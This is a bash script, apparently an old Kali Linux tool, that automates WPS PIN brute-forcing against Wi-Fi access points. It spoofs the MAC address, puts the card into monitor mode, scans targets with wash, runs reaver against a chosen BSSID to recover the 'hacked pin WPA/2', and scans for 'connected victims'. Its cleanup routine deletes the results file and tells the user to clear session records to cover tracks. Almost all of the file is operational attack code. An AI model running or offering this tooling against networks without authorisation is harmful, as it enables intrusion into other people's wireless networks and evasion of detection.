#!/bin/bash
#----------------------------------------------------------------------------------------------#
#copyright @ nu11secur1ty 2014                                                                 #
#http://nu11secur1ty.blogspot.com/                                                             #
#                                                                                              #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#                By running this, YOU are using this program at YOUR OWN RISK.                 #
#                This software is provided, WITHOUT ANY guarantees OR warranty.                #
#---Defaults-----------------------------------------------------------------------------------#

clear
version="0.1 (#f0r K@l1L1nux)

                ® nu11secur1ty"
   s="\e[01;34m"; n="\e[00m"
echo -e "\e[00;32m             
                     # 
               @ @ @ @  @@@  @ @ 
                 @   @  @    @@ 
                 @   @  @    @ @ 
         W I F I @   @  @@@  @  @ "$s"v$version"$n"\e[00m 

-------------------"$s"Main Menu"$n"---------------------"

# cleanup function with Ctrl+C
cleanup()
{
#Edit if you want!
   airmon-ng stop wlan0
   airmon-ng stop mon0
   airmon-ng stop mon1
   airmon-ng stop mon2
   airmon-ng stop mon3
#----------------------------
   airmon-ng stop wlan1
   airmon-ng stop mon0
   airmon-ng stop mon1
   airmon-ng stop mon2
   airmon-ng stop mon3
   service network-manager start
   service network-manager restart
   /etc/init.d/networking restart
killall leafpad
rm ~/result.txt
cd /etc/reaver
nautilus "$PWD"

#---------------------

#Clean
   echo -e "\e[00;35m[!]\e[00m Clear everything GoodBye =)"
   echo -e "\e[00;31m  When you see the reaver folder to open.
  CLEAN EVERY MAC SESSION IN THIS FOLDER FOR YOUR SAFETY AND CLOSED THE FILE!!\e[00m"
   echo -e "\e[00;35m[NOTE]\e[00m Do not delete reaver.db :D" 
      return $?
}
# run if user hits control-c
   control_c()
{
   cleanup
      exit $?
}
# trap keyboard interrupt (control-c)
trap control_c SIGINT

#---------------------------------------
                 
 
#Choise interface 
    echo -e "$s"Choice wlan interface?"$n"
    echo -e  "\e[00;33m[1]\e[00m  wlan0"
    echo -e  "\e[00;33m[2]\e[00m  Other Wlan Devices"
    echo -e  "\e[00;33m[3]\e[00m  Check for connected victims"
#----------------------------------------------------------------
 echo -e  "\e[00;31m[!]\e[00m Please choose between [1,2, or 3] or press enter to close?"

 echo -e "------------------------------------------------------------
           \e[00;31m WARNING! If you not use wlan0 press Ctrl+C.     
           Then connect your device, and run program again!\e[00m  
          --------------------------------------------------"
 echo -e "
        \e[00;32m If you not want to use this program just press enter.\e[00m  
          ---------------------------------------------------"


# read user input
       read choice
# choice wlan0 or wlan1;

#PART 1

  if   [[ "$choice" -eq 1 ]]; then
       echo -e "\e[00;31m[IMPORTANT!]\e[00m" 
 echo -e  "\e[00;33m Wait to capture information! 
--------------------------------------------------------------------------- 
If you want you can opened manually in /root/result.txt directory
But after the program stop this file will be deleted for your safety.\e[00m"
         xterm -e service network-manager stop
         xterm -e ifconfig wlan0 down
         xterm -e macchanger -a wlan0
         xterm -e airmon-ng start wlan0
         xterm -e timeout 120s wash -i mon0 --out-file ~/result.txt 
                  leafpad /root/result.txt &

         echo -e "\e[00;35m[What is the MAC address for the target?]\e[00m "
               read TARGET
         echo -e "\e[00;35m[What is the CHANNEL for the target?]\e[00m "
               read CHANNEL
               gnome-terminal -e "bash -c 'reaver -i mon0 -b $TARGET -vv -c $CHANNEL; exec $SHELL'" &
         echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
         echo -e "\e[00;31m[When the program is finished save hacked pin WPA/2 and Press Ctrl+C to EXIT & ClEAN!]\e[00m"
               sleep 48h 
         read 
        
   fi

#PART 2

   if   [[ "$choice" -eq 2 ]]; then
       echo -e "\e[00;31m[IMPORTANT!]\e[00m" 
       echo -e  "\e[00;33m Wait to capture information! 
--------------------------------------------------------------------------- 
If you want you can opened manually in /root/result.txt directory
But after the program stop this file will be deleted for your safety.\e[00m"
         xterm -e service network-manager stop
         xterm -e ifconfig wlan1 down
         xterm -e macchanger -a wlan1
         xterm -e airmon-ng start wlan1
         xterm -e timeout 120s wash -i mon0 --out-file ~/result.txt 
                  leafpad /root/result.txt &

         echo -e "\e[00;35m[What is the MAC address for the target?]\e[00m "
               read TARGET
         echo -e "\e[00;35m[What is the CHANNEL for the target?]\e[00m "
               read CHANNEL
               gnome-terminal -e "bash -c 'reaver -i mon0 -b $TARGET -vv -c $CHANNEL; exec $SHELL'" &
         echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
         echo -e "\e[00;31m[When the program is finished save hacked pin WPA/2 and Press Ctrl+C to EXIT & ClEAN!]\e[00m"
               sleep 48h 
         read 
         
  fi

#PART 3
    
  if [[ "$choice" -eq 3 ]]; then
               xterm -e ifconfig wlan0 down
               xterm -e macchanger -a wlan0
               xterm -e ifconfig wlan0 up
                      echo -e "\e[00;34m[Wait to Scan wlan0 or press Ctrl+C to next scan]\e[00m"
        $wlan0 xterm -geometry 100x30 -e timeout 120s netdiscover -i wlan0
             
               xterm -e ifconfig wlan1 down
               xterm -e macchanger -a wlan1
               xterm -e ifconfig wlan1 up
                      echo -e "\e[00;34m[Wait to Scan wlan1 or press Ctrl+C to EXIT]\e[00m"
        $wlan1 xterm -geometry 100x30 -e timeout 120s netdiscover -i wlan1
   
                      echo -e "\e[00;31m[IMPORTANT!!!]\e[00m"
                      echo -e "\e[00;31m[When the program is finished Press Ctrl+C to EXIT & ClEAN!]\e[00m"
                    sleep 5 
               read
               
  fi 
                     exit;
